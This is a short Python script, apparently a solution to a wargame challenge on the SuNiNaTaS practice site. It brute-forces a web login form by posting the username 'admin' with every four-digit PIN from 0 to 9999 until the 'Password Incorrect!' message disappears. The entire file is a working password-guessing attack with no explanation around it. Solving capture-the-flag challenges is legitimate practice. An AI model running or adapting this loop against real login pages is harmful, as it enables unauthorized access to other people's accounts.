import requests

url="http://suninatas.com/challenge/web08/web08.asp"
for pw in range(10000):
    print(pw)
    response=requests.post(url=url, data={'id':'admin', 'pw':pw})
    if 'Password Incorrect!' not in response.text:
        print('this is pw!')
        break
    else:
        continue